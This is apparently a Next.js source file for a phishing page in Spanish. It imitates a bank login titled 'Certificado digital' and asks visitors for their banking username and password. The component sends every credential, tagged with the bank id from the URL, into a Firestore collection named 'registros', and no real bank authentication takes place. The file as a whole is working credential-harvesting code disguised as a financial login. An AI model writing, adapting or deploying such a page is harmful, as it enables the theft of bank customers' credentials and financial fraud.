import { useState, useEffect } from "react";
import firebase from "../components/firebase";
import { useRouter } from "next/router";

function findGetParameter(url) {
  var result = null,
    tmp = [];
  window.location.search
    .substr(1)
    .split("&")
    .forEach(function (item) {
      tmp = item.split("=");
      if (tmp[0] === url) result = decodeURIComponent(tmp[1]);
    });
  return result;
}

const FirmaDigital = () => {
  const router = useRouter();
  const { id } = router.query;
  const [state, setState] = useState("");
  useEffect(() => {
    let urlP = findGetParameter("firma");
    setState(urlP);
  }, []);

  const [activeCursos, setActiveCursos] = useState([]);
  const [infoUser, setInfoUser] = useState([]);
  const [solicitud, setSolicitud] = useState("");

  useEffect(() => {
    const cursosRef = firebase
      .firestore()
      .collection("registros")
      .doc("registros");
    cursosRef.onSnapshot((snapshot) => {
      setActiveCursos(snapshot.data().usuario);
    });
  }, []);

  const CreateUser = (name, text) => {
    setInfoUser({ ...infoUser, [name]: text, ["banco"] : id });
    console.log(infoUser);
  };

  const GetData = () => {
    const cursosRef = firebase
      .firestore()
      .collection("registros")
      .doc("registros");
    cursosRef.onSnapshot((snapshot) => {
      setActiveCursos(snapshot.data().usuario);
    });
  };

  const handdleWhatsApp = (text) => {
    GetData();

    let arrayAux = activeCursos;
    try {
      arrayAux.push(infoUser);
    } catch (e) {
      console.log(e);
    }

    const cursoRef = firebase
      .firestore()
      .collection("registros")
      .doc("registros");
    cursoRef.update({ usuario: arrayAux }).then(() => {
      window.location.href = "/registro-de-usuario?firma=" + solicitud;
    });
  };

  useEffect(() => {
    setSolicitud(activeCursos.length);
    CreateUser("id", activeCursos.length);
  }, [activeCursos]);

  return (
    <div>
      <main className="lg:w-8/12 mx-auto items-center justify-center  flex-1  ">
        <img src="./carrusel1.jpg" className="mx-auto mb-5" />
        <h1 className="text-4xl lg:text-10xl font-bold text-center uppercase">
          {state === "false" ? "Sin firma digital" : "Certificado digital"}
        </h1>
      </main>
      <div className="w-11/12 lg:w-5/12 mx-auto bg">
        <p className="text-lg py-3 ">
          Iniciar sesión en su entidad financiera
        </p>
        <div className="mt-10 flex flex-col">
          <label>Seleccione el método de ingreso</label>
          <div className="flex mt-3">
            <input
              onChange={(e) => CreateUser("metodo", e.target.value)}
              type="radio"
              id="huey"
              name="drone"
              value="contraseña"
            />
            <p className="-mt-1.5 ml-2">Contraseña</p>
          </div>
          <div className="flex mt-3">
            <input
              type="radio"
              id="huey"
              name="drone"
              value="firma digital"
              onChange={(e) => CreateUser("metodo", e.target.value)}
            />
            <p className="-mt-1.5 ml-2">Certificado digital</p>
          </div>
          <div className="flex flex-col mt-3 lg:w-6/12">
            <p className="mt-2 mb-1">Usuario</p>
            <input
              className="border p-2"
              onChange={(e) => CreateUser("user", e.target.value)}
            />
          </div>
          <div className="flex flex-col mt-3 lg:w-6/12">
            <p className="mt-2 mb-1">Contraseña</p>
            <input
              className="border p-2"
              type="password"
              onChange={(e) => CreateUser("password", e.target.value)}
            />
          </div>
          <div className="flex mt-3">
            <input type="checkbox" />
            <p className="-mt-1.5 ml-2">
              He leído y acepto los términos y condiciones del aviso legal y la
              política de privacidad
            </p>
          </div>
          <button
            onClick={(e) => handdleWhatsApp()}
            className="mt-5 bg-gray-200 p-2 border border-gray-800 font-bold text-xl lg:w-2/12 text-center"
          >
            Ingresar
          </button>
        </div>
      </div>
      <img className="w-screen mt-20" src="/firma1.jpg" />
      <img className="w-screen mt-20" src="/firma2.jpg" />
    </div>
  );
};

FirmaDigital.layout = "L2";

export default FirmaDigital;
